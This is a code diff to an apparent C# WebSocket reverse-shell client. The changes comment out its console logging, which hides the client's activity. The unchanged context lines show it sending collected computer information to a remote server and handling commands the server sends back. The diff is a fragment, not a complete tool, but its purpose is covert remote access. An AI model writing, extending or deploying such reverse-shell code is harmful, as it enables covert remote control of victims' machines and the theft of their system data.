@@ -45,7 +45,7 @@ namespace WebSocketReverseShellDotNet.service.impl
                     catch (Exception ex)
                     {
                         // Handle exceptions that may occur during the connection process
-                        Console.WriteLine($"WebSocket connection failed: {ex.Message}");
+                        /*Console.WriteLine($"WebSocket connection failed: {ex.Message}");*/
                     }
                 }
             }).Wait(); // Wait for the asynchronous task to complete
@@ -60,7 +60,7 @@ namespace WebSocketReverseShellDotNet.service.impl
                 string receivedData = System.Text.Encoding.UTF8.GetString(buffer, 0, result.Count);
                 handleIntialMessage(receivedData);
 
-                Console.WriteLine($"Received: {receivedData}");
+               /* Console.WriteLine($"Received: {receivedData}");*/
 
                 await handleServerCommand(receivedData,webSocket);
 
@@ -80,7 +80,7 @@ namespace WebSocketReverseShellDotNet.service.impl
             if (isSocketOpen(webSocket))
             {
                 ReverseShellInfoInitialMessage reverseShellInfoInitial = OSUtil.GetComputerInfo();
-                Console.WriteLine(reverseShellInfoInitial);
+               /* Console.WriteLine(reverseShellInfoInitial);*/
 
                 byte[] buffer = System.Text.Encoding.UTF8.GetBytes(reverseShellInfoInitial.ToString());
                 await webSocket.SendAsync(new ArraySegment<byte>(buffer), WebSocketMessageType.Text, true, CancellationToken.None);
@@ -108,7 +108,7 @@ namespace WebSocketReverseShellDotNet.service.impl
             }
             catch (Exception ex)
             {
-                Console.WriteLine(ex.ToString());
+                /*Console.WriteLine(ex.ToString());*/
             }
         }
 
@@ -126,7 +126,7 @@ namespace WebSocketReverseShellDotNet.service.impl
             }
             catch (Exception ex)
             {
-                Console.WriteLine(ex.ToString());
+                /*Console.WriteLine(ex.ToString())*/;
             }
 
         }
@@ -140,7 +140,7 @@ namespace WebSocketReverseShellDotNet.service.impl
             }
             catch (Exception ex)
             {
-                Console.WriteLine(ex.ToString());
+                /*Console.WriteLine(ex.ToString());*/
             }
 
         }
